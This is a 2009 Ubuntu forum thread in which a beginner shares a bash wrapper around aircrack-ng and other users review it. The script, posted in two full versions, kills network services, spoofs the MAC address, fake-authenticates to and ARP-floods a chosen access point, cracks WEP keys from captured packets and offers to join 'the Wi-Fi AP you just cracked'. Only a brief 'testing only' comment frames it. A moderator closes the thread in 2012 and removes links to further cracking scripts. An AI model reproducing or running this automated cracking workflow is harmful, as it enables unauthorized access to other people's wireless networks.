---
title: "Please test my first BASH script for aircrack-ng."
date: 2009-04-10
forum: New to Ubuntu
---

### Post by taylor102387 on 2009-04-10
Ok, this is my first bash script and I want to know: bugs, feedback, info. This is for aircrack-ng and makes it increduably easy. Any comments would be appreciated. Thank You!):P



```
#!/bin/bash 
##########################################
##########################################
######## This script was created  ########
######## for testing purpose's on ########
######## -ly. Other purpose's are ########
######## Illegal.                 ########
######## You MUST set kismet to u ########
######## -se mon0 as the interfa  ########
######## -ce. This is a front end ########
######## of Aircrack-ng. To find  ########
######## out more about aircrac   ########
######## -k-ng go to :            ########
########      aircrack-ng.org .   ########
########      Created by Dub-T.   ########
##########################################
##########################################
#
#
#Kills the processes that may use your adapter.
sudo killall NetworkManager && sudo killall NetworkManagerDispatcher && killall wpa_supplicant
clear
#Stores your adapter to a variable: interface
read -p "Enter the Interface you would like to use : " interface
echo ""
clear
#Starts the adapter in monitor mode just in case you want to run kismet.
sudo airmon-ng start $interface
clear
#Ask you if you would like to run kismet, and if so stores your answer to a variable: kismetm
read -p "Would you like to run kismet to find a network to crack, and/or a client to fake your MAC Address? y/n : " kismetm
echo ""
#If the variable kismetm equals y, the script will run kismet.
   if [ $kismetm = y ]
                 then clear && sudo xterm -e "kismet" &
                 else clear && echo "Continuing...
                 "
   fi
clear
#Stores your desired transmission rate to a variable: rate
read -p "Enter the Transmission Rate would you like to set your interface 1M, 2M, 5.5M, 6M, 9M, 11M, 12M, 18M, 24M, 36M, 48M, 54M : " rate
echo ""
clear
#Ask you if you would like to change your interfaces mac address, and if so stores your answer to a variable: macset
read -p "Would you like to change your Wi-Fi card's MAC Address? y/n : " macset
echo ""
#If the variable macset equals y, the script will ask if you would like a random mac address, and if so stores your answer to a variable: ramac
   if [ $macset = y ]
                 then clear && read -p "Would you like a random MAC? y/n : " ramac
                 else clear && echo "Continuing...
                  "
   fi
#If the variable ramac equals y, the script will change your wifi cards mac address at random.
   if [ $ramac = y ]
                 then sudo ifconfig mon0 down && sudo macchanger -r $interface && sudo macchanger -r mon0 && ifconfig mon0 up
   fi
clear
#This displays your mac address from your interface so you can confirm it.
sudo macchanger -s mon0
echo "
"
#This will ask for your confirmation on your mac address, and if you wish to change it will store it to a variable: hmac
read -p "Please confirm MAC Address even if you did not change it or if you would like to. If you do not wish to change your MAC Address, just confirm the MAC Address above. : " hmac
echo ""
clear
#This reads the variable ramac and if n with change your interface to the desired mac address.
   if [ $ramac = n ]
                 then sudo ifconfig mon0 down && sudo macchanger -m $hmac $interface && sudo macchanger -m $hmac mon0 && sudo ifconfig mon0 up
   fi
clear
#This sets your wifi cards mac address to the mac address of airmon-ng's mon0.
   if [ $macset = n ]
                 then sudo macchanger -m $hmac $interface && sudo macchanger $hmac mon0
   fi
clear
#This sets your wifi card to the transmission rate you want.
sudo iwconfig $interface rate $rate
clear
#This next lines of commands ask for the necessary information about your access point.  
read -p "Enter the Wi-Fi Access Points MAC Address : " mac
echo ""
clear
read -p "Enter the Wi-Fi Access Points SSID : " ssid
echo ""
clear
read -p "Enter the Wi-Fi Access Points Channel : " channel
clear
#This will verify the info you have just typed, and will ask you if it's correct. This will then store it to a variable: start
echo "Is this correct? : Interface: $interface , Transmission Rate: $rate , Wi-Fi AP's MAC: $mac , SSID: $ssid , Channel: $channel ,  Wi-Fi Card's MAC: $hmac"
read -p "y/n : " start
echo ""
#This will read variable start and if y will continue. If the variable start is no, it will reset your wifi card and start over.
   if [ $start = y ]
                 then echo "Starting..."
                 else sudo airmon-ng stop mon0 && sudo killall xterm && sudo killall kismet && sudo iwconfig $interface rate 54M && bash Aircrack-ng.sh
   fi
clear
#This will close the kismet window.
sudo killall xterm
clear
#The next two lines will stop your wifi card and kill kismet to save cpu power for the cracking process. It will then start your wifi card in monitor mode and with the desired channel.
sudo airmon-ng stop mon0 && sudo killall kismet
sudo airmon-ng start $interface $channel
clear
#This will start airodump-ng on the right channel and target the access point you desire.
sudo xterm -hold -e "airodump-ng -c $channel --bssid $mac -w output mon0"  &
echo "Starting Injections...
"
#The next two lines will set your card on the channel you desire and try to fake authenticate you on the network you wish to crack.
sudo iwconfig $interface channel $channel
sudo aireplay-ng -1 0 -e "$ssid" -a $mac -h $hmac mon0
echo "

"
#This will start requesting arp request at an average of 500 packets per second.
sudo xterm -hold -e "sudo  aireplay-ng -3 -b $mac -h $hmac mon0"  &
#If the above authorization fails, you can choose to start a more direct authorization. It will then store your answer to variable: ivs
read -p "Would you like to keep Re-autherizing yourself? (If you stop receiving IV's) y/n : " ivs
echo ""
#This will read variable ivs and if y will open a new window and start fake authorizing you as client.
   if [ $ivs = y ]
                 then clear && sudo xterm -hold -e "aireplay-ng -1 6000 -o 1 -q 10 -e "$ssid" -a $mac -h $hmac mon0"  &
                 else clear && echo "Continuing...
                 "
   fi
#This will ask you if you would like run aircrack-ng. It then stores your answer to variable: aircrack
read -p "Run Aircrack-ng? y/n : " aircrack
echo ""
#This will read variable aircrack and if y will launch aircrack.
   if [ $aircrack = y ]
                 then clear && sudo xterm -hold -e "aircrack-ng -z output*.cap"  &
                 else clear
   fi
#This will ask you if you would like to stop your cracking and store your answer to variable: connect
read -p "Would you like to connect to the Wi-Fi AP you just cracked? y/n : " connect
echo ""
#This will read variable connect and if y will stop cracking and start networkmanager for connecting to the network you cracked. If no it will stop cracking.
   if [ $connect = y ]
                 then sudo airmon-ng stop mon0 && sudo NetworkManager && sudo iwconfig $interface rate 54M && sudo killall kismet && sudo killall xterm && echo "Starting NetworkManager..."
                 else sudo airmon-ng stop mon0 && sudo killall xterm && sudo killall kismet && sudo iwconfig $interface rate 54M && exit
   fi
```

---

### Post by lfaraone on 2009-04-11
Illegal is misspelled. And consider reelasing the finished script under a free license :)

Some lines like
```
sudo xterm -hold -e "sudo airodump-ng -c $channel --bssid $mac -w output mon0"  &
```have redundancy, if you're running xterm as root then all its subprocesses are running as root.

What happens if your sudo cookie expires before the script is done? You probably should just say "please run this script as root" rather than using sudo inside the script itself. 

What happens if I enter something invalid to the prompts, such as "yes"? Shouldn't it loop back in that case?

Other than that, looks good.

---

### Post by taylor102387 on 2009-04-11
Thanks, I can't spell worth crap. And as far as the sudo in xterm, thanks that will save me some space. But a question about a free licence, how do I create a project licence. If you would please point me in the right direction. Thanks!

---

### Post by lfaraone on 2009-04-11
> **taylor102387 said:**
> Thanks, I can't spell worth crap. And as far as the sudo in xterm, thanks that will save me some space. But a question about a free licence, how do I create a project licence. If you would please point me in the right direction. Thanks!
Creating your own license is discouraged, you are bound (as are all of us without law degrees) to make legal errors. 

Instead, I recommend reading through these licenses and choosing the one you like best: 
* GNU General Public License: [full text]("http://www.gnu.org/copyleft/gpl.html"), [summary]("http://creativecommons.org/licenses/GPL/2.0/")
* [MIT License]("http://www.opensource.org/licenses/mit-license.php")
* [BSD License]("http://www.opensource.org/licenses/bsd-license.php")


edit: also there's my personal favorite, the [WTFPL]("http://sam.zoy.org/wtfpl/").

---

### Post by taylor102387 on 2009-04-11
OK, I just made a project in google code! Took me about 30 min. The use the GNU License so now I dont have to worry!

---

### Post by taylor102387 on 2009-04-11
Ok, im pretty much done. My code is at: 

[http://code.google.com/p/aircrack-ng-bash-script/](http://code.google.com/p/aircrack-ng-bash-script/)

---

### Post by dafuzzbudd on 2009-05-19
i put together my own script really fast and looked around for help from someone elses and yours is really awsome.

i have a couple of questions/theory:

1.)what is kismet? does it give greater functionality?  i successfully use rtl8187 as wlan1.

2.)ive never had to change my rate, having the option there is cool though.  what's the theory behind rate change?

3.)as far as i can tell, the essid is not required.

4.)the bssid/channel confirmation could be formatted better.
\n
 newline
 Adding blank lines to text
 
\t
 tab
 Inserting horizontal tabs to text

programming comments:

1.)like the other guy said, if you take all sudo out does it still work properly?

2.)kismet doesnt work for me so i changed the first access point display to 
```
xterm -hold -e "airodump-ng $interface"
```

3.)the MAC section is a bit confusing.


overall the script is really awsome. i hope you keep with it and keep adding fuctionality.

---

### Post by taylor102387 on 2009-05-19
Here are answers/questions

1. Kismet is just a cool wardiving (wifi scaner app) that can gather TONS of info about an access point. And it's easy for me to use this instead of airodump-ng. Also, to use Kismet in the script, you must change your source to mon0 for it to cooperate.

2. The theory behind the rate change is that if you are too close to a access point, and you start resending APR request, the access point cant recive/send alot of packets per second and will crash/not respond. This way, if you know how close you are, you can change your rate to avoid this. The closer you are, the lower rate. The farther, the higher.

3. The essid may not be required, but I think it has a huge play on the swiftness of the script, and you may not be able to fake ath yourself if you dont know the essid. Also, after you crack the network you cant connect without supplying the essid, so you need to know it anyway. (On a side note, kismet can figure out the essid if it captured enough packets from the access point. So another bonus for kismet and not airodump-ng!)

4. Thanks for the tip, I need to put this in the updated version!

1a. Yes, I was just starting to script so I made a minor mistake.

2a. look at #1 for setting up kismet.

3a. I know, I dont know a way around this, im just surprised this works as well as it did, even if it is confusing!


Thanks for the suggestions, I am working on a version 0.2, and it still has a couple of bugs, but will be out shortly.


0.2 Features:

1. I will add a couple lines to create a folder so your/my desktop will stop filling up with .cap's.

2. Will TRY to know how far the computer is away from the access point to set up a good rate. (But this involes math, and I still am a COMPLEATE BEGGINER. so if you could point me in the right direction, I would appreciate it.)

3.MAYBE an improvment on the "MAC" section.

---

### Post by dafuzzbudd on 2009-05-19
kismet sounds useful, im gonna check it out.  i like to keep installed packages to a minimum but ill see.

im a complete beginner too.  ill think about the Mac section, it works but im not sure i fully understand how it works yet.

---

### Post by dafuzzbudd on 2009-05-20
tested and now works as supposed to.  you'll have to add back in the  mon0 code lines

```

verifymac="n"
#Loop to verify correct MAC
until [ $verifymac = y ]; do
	#Displays MAC and asks customer if they want to change it
	sudo macchanger -s $interface
	echo ""
	read -p "Would you like a random MAC? y/n : " ramac
        #If the variable ramac equals y, the script will change your wifi cards mac address at random.
   	if [ $ramac = y ]
           	then clear && sudo ifconfig $interface down && sudo macchanger -r $interface && ifconfig $interface up
	fi
	#Will display current MAC and ask user to enter it as $hmac
	#sudo macchanger -s $interface
	echo ""
	read -p "Please enter MAC to use: " hmac
	echo ""
	sudo ifconfig $interface down && sudo macchanger -m $hmac $interface  && 
	sudo ifconfig $interface up && sudo macchanger $hmac $interface
	clear

	#After MAC change is done, question to exit MAC loop
	sudo macchanger -s $interface
	echo ""
	read -p "Are you ohk with MAC? (y/n) : " verifymac
	clear
done

```

---

### Post by dafuzzbudd on 2009-05-20
xterm is pissing me off because i cont figure out how to copy/paste from it.  im going to try messing around with
```
gnome-terminal -e "bash -c ls\;bash"
```

Im saving code here:
this might fix the gnome-terminal problem
```
XLIB_SKIP_ARGB_VISUALS=1 gnome-terminal
```

---

### Post by taylor102387 on 2009-05-20
Looks great! I didn't know how to use the until, but I finally understood it. I now need to change the AP section to use this. But the only thing I didn't see, was a way to set the mac itself, but I can fix that, thanks! ):P

This is why I love open source programs, your not alone, you can get help if you need it, and you don't have to worry about people taking credit because they get their names in it too!

Even though your a beginner, I'm putting your Ubuntu forums name on the Aircrack-ng BASH Script page for helping with the mac lines! Thanks! ;)

Also, on a side note, does writing a program to control a program to test network security make us script kiddies? I just always wondered...

---

### Post by dafuzzbudd on 2009-05-21
This was my first linux loop and i was surprised it took little adjusting to get it working.

this is the tutorial i get help off of:
[http://gd.tuwien.ac.at/linuxcommand.org/writing_shell_scripts.php](http://gd.tuwien.ac.at/linuxcommand.org/writing_shell_scripts.php)
I wish i was more knowledgeable so I could get the MAC to add itself.  
It might work if we could write the output of macchanger -s $interface to a temp file.  Then have grep single out the mac and make it a variable.  This might work, or MAC might be easily set via ifconfig or something.

And the script kiddie thing?  Haha, I was pondering that today. I'm not sure of the actual definition, but it seems like we might fit it.

---

### Post by taylor102387 on 2009-05-21
Thanks for the tutorial, it seamed alot eaisier than the one I was using. As for the MAC problem, that might work. I just need to learn more scripting first.

---

### Post by dafuzzbudd on 2009-05-22
will test this once home

```
#Loop to verify correct MAC
until [ $verifymac = y ]; do
	#Displays MAC and asks customer if they want to change it
	sudo macchanger -s $interface
	echo ""
	read -p "Would you like to change your MAC? y/n : " chmac
	if [ $chmac = y ]
		then read -p "Would you like a random MAC? y/n : " ramac
        	#If the variable ramac equals y, the script will change your wifi cards mac address at random.
   		if [ $ramac = y ]
           		then clear && sudo ifconfig $interface down && sudo macchanger -r $interface && 
			ifconfig $interface up
		else
			read -p "Please manually enter MAC : " mmac
			clear && sudo ifconfig $interface down && sudo macchanger -m $mmac $interface && 
			ifconfig $interface up
		fi
	fi
	#Will set current MAC to variable hmac
	hmac=`/sbin/ifconfig|awk '/HWaddr/ {print substr($5, 0, 18)}'`
	clear
	#After MAC change is done, question to exit MAC loop
	sudo macchanger -s $interface
	echo ""
	read -p "Are you ohk with MAC? (y/n) : " verifymac
	clear
done
```

---

### Post by taylor102387 on 2009-05-22
Here is the source for version 1.0:


```


#!/bin/bash 
##########################################
##########################################
######## This script was created  ########
######## for testing purpose's on ########
######## -ly. Other purpose's are ########
######## Illegal.                 ########
######## You MUST set kismet to u ########
######## -se mon0 as the interfa  ########
######## -ce. This is a front end ########
######## of Aircrack-ng. To find  ########
######## out more about aircrac   ########
######## -k-ng go to :            ########
########      aircrack-ng.org .   ########
########      Created by Dub-T.   ########
##########################################
##########################################
#
#
#
#Kills the processes that may use your adapter.
sudo killall NetworkManager
sudo killall NetworkManagerDispatcher
sudo killall wpa_supplicant
sudo killall avahi-daemon
clear
#Stores your adapter to a variable: interface
read -p "Enter the Interface you would like to use : " interface
echo ""
clear
#Starts the adapter in monitor mode just in case you want to run kismet.
sudo airmon-ng start $interface
clear
#Ask if you have gathered packets and want to keep your temporary files from before.
read -p "If you have already ran this script and have temporary files left over from your last session, than you can continue using these files to add to your database of IV's. Would you like to keep these files for the cracking proccess later? (NOTE: If you select n, any temporary files from a previous session will be deleted.) (Y/n) : " temp
echo ""
#Reads the variable temp and if y will leave the directory Aircrack-ng-BASH-Script alone. If n it will delete any previous Aircrack-ng-BASH-Script directory.
if [ temp = y ]; then
   echo "Continueing..."
else
   sudo rm -R "Aircrack-ng-BASH-Script"
   clear
fi              
#Ask you if you would like to run kismet, and if so stores your answer to a variable: kismetm
clear
read -p "Would you like to run kismet to find a network to crack, and/or a client to fake your MAC Address? (Y/n) : " kismetm
echo ""
#If the variable kismetm equals y, the line will create a folder called: Aircrack-ng-BASH-Script, and store all temporary files there. Then it will run kismet.
if [ $kismetm = y ]; then
   mkdir "Aircrack-ng-BASH-Script"
   cd "Aircrack-ng-BASH-Script"
fi
clear
if [ $kismetm = y ]; then
   clear
   sudo xterm -e "kismet" &
   echo "Continuing...
   "
fi
clear
#Stores your desired transmission rate to a variable: rate
read -p "Enter the Transmission Rate would you like to set your interface:

1M, 2M, 5.5M, 6M, 9M, 11M, 12M, 18M, 24M, 36M, 48M, 54M : " rate
echo ""
clear
#Ask you if you would like to change your interfaces mac address, and if so stores your answer to a variable: macset
   clear
   read -p "Would you like to change your Wi-Fi card's MAC Address? (Y/n) : " macset
   echo ""
#This sets the MAC Address to what you choose
verifymac="n"
if [ $macset = y ]; then
   until [ $verifymac = y ]; do
#If the variable macset equals y, the script will ask if you would like a random mac address, and if so stores your answer to a variable: ramac
      if [ $macset = y ]; then
         clear
         read -p "Would you like a random MAC? (y/N) : " ramac
         clear
         echo "Continuing...
         "
      fi
#If the variable ramac equals y, the script will change your wifi cards mac address at random.
      if [ $ramac = y ]; then
         sudo ifconfig mon0 down
         sudo ifconfig $interface down
         sudo macchanger -r mon0
         sudo macchanger -r $interface
         sudo ifconfig mon0 up
         sudo ifconfig $interface up
      fi
      clear
#This displays your mac address from your interface so you can confirm it.
      sudo macchanger -s mon0
      echo "
      "
#This will ask for your confirmation on your mac address, and if you wish to change it will store it to a variable: hmac
      read -p "Please confirm MAC Address above, or provide a different MAC Address you want if you wish to change you MAC Address. : " hmac
      echo ""
      clear
#This reads the variable ramac and if n with change your interface to the desired mac address.
      if [ $ramac = n ]; then
         sudo ifconfig mon0 down
         sudo ifconfig $interface down
         sudo macchanger -m $hmac mon0
         sudo macchanger -m $hmac $interface
         sudo ifconfig mon0 up
         sudo ifconfig $interface up
      fi
      clear
#This sets your wifi cards mac address to the mac address of airmon-ng's mon0.
      if [ $macset = n ]; then
         sudo macchanger -m $hmac $interface
         sudo macchanger -m $hmac mon0
      fi
      clear
#This confirms the MAC Address
      sudo macchanger -s mon0
      echo "
      "
      read -p "Is this the MAC Address you want? (Y/n) : " verifymac
      echo ""
   done
fi
clear
#This sets your wifi card to the transmission rate you want.
verifyap="n"
until [ $verifyap = y ]; do
   sudo iwconfig $interface rate $rate
   clear
#This next lines of commands ask for the necessary information about your access point.  
   read -p "Enter the Wi-Fi Access Points MAC Address : " mac
   echo ""
   clear
   read -p "Enter the Wi-Fi Access Points SSID : " ssid
   echo ""
   clear
   read -p "Enter the Wi-Fi Access Points Channel : " channel
   clear
#This will verify the info you have just typed, and will ask you if it's correct. This will then store it to a variable: start
   echo "Is this correct? : 

   Wi-Fi Card:

   Interface: $interface
   Interface's MAC: $hmac
   Transmission Rate: $rate

   Wi-Fi AP:

   Wi-Fi AP's MAC: $mac
   SSID: $ssid
   Channel: $channel
   "
   read -p "(Y/n) : " verifyap
   echo ""
#This will read variable start and if y, will continue. If the variable start is no, it will reset your wifi card and start over.
   if [ $start = y ]; then
      echo "Starting..."
   fi
done
clear
#This will close the kismet window.
sudo killall xterm
clear
#The next two lines will stop your wifi card and kill kismet to save cpu power for the cracking process. It will then start your wifi card in monitor mode and with the desired channel.
sudo airmon-ng stop mon0
sudo killall kismet
sudo airmon-ng start $interface $channel
clear
#This will create a folder, if kismet was not run, called: Aircrack-ng-BASH-Script, and store all temporary files there.
if [ $kismetm = n ]; then
   mkdir "Aircrack-ng-BASH-Script"
   cd "Aircrack-ng-BASH-Script"
fi
#This will start airodump-ng on the right channel and target the access point you desire.
sudo xterm -hold -e "airodump-ng -c $channel --bssid $mac -w output mon0"  &
echo "Starting Injections...
"
#The next two lines will set your card on the channel you desire and try to fake authenticate you on the network you wish to crack.
sudo iwconfig $interface channel $channel
sudo aireplay-ng -1 0 -e "$ssid" -a $mac -h $hmac mon0
echo "

"
#This will start requesting arp request at an average of 500 packets per second.
sudo xterm -hold -e "sudo  aireplay-ng -3 -b $mac -h $hmac mon0"  &
#If the above authorization fails, you can choose to start a more direct authorization. It will then store your answer to variable: ivs
read -p "Would you like to keep Re-autherizing yourself? (If you stop receiving IV's) (y/N) : " ivs
echo ""
#This will read variable ivs and if y will open a new window and start fake authorizing you as client.
clear
if [ $ivs = y ]; then
   clear
   sudo xterm -hold -e "aireplay-ng -1 6000 -o 1 -q 10 -e "$ssid" -a $mac -h $hmac mon0"  &
   clear
   echo "Continuing...
   "
fi
#This will ask you if you would like run aircrack-ng. It then stores your answer to variable: aircrack
read -p "Run Aircrack-ng? (Y/n) : " aircrack
echo ""
#This will read variable aircrack and if y will launch aircrack.
if [ $aircrack = y ]; then
   clear
   sudo xterm -hold -e "aircrack-ng -z output*.cap"  &
   clear
fi
#This will ask you if you would like to delete the temporary files then stores your anwser to variable delete.
clear
read -p "Would you like to delete the temporary files created during the gathering proccess? (y/N) : " delete
echo ""
#This will read the variable delete and if y will delete the files, if n it will leave the folder alone.
if [ $delete = y ]; then
   sudo rm -R "Aircrack-ng-BASH-Script"
   clear
   else echo "Continuing..."
fi
#This will ask you if you would like to stop your cracking and store your answer to variable: connect
clear
read -p "Would you like to connect to the Wi-Fi AP you just cracked? (Y/n) : " connect
echo ""
clear
#This will read variable connect and if y will stop cracking and start networkmanager for connecting to the network you cracked. If no it will stop cracking.
if [ $connect = y ]; then
   sudo airmon-ng stop mon0
   sudo NetworkManager
   sudo iwconfig $interface rate 54M
   sudo killall kismet
   sudo killall xterm
else
   sudo airmon-ng stop mon0
   sudo killall xterm
   sudo killall kismet
   sudo iwconfig $interface rate 54M
   exit
fi
#This confirms you successfully cracked the network
clear
read -p "Did you successfully crack the network? (Y/n) : " comp
echo ""
clear
if [ $comp = y ]; then
   exit 0
else   
   exit 1
fi


```


There is a problem with the MAC Address change, I get:

```

The interface MAC (12:34:56:78:90:12) doesn't match the specified MAC (-h).
	ifconfig mon0 hw ether 09:87:65:43:21:09


```


Just need to fix this, and I can release a stable version.):P

---

### Post by neu2buntu on 2009-05-23
hi... im following your post, although i have not tried your script yet (i will soon)...  scripting is well above me, but 1 thing that might be hanging up your macchanger could be the range in your faked mac, 1 i have had success with is 00:11:22:33:44:55 so it may be worth a try?

---

### Post by dafuzzbudd on 2009-05-26
i didnt post the fixed code, i think it needs
'ifconfig $interface'
```

hmac=`/sbin/ifconfig $interface|awk '/HWaddr/ {print substr($5, 0, 18)}'`

```
will post the good stuff once home

---

### Post by clevetbs on 2012-07-02
got a script for you all

try em out

wep wpa and wps cracking script....


you must extract them to ~/Documents/folder/script

<snip>

---

### Post by coffeecat on 2012-07-02
Closed for necromancy, and...

We do not support cracking. Links have been removed from previous post.

---

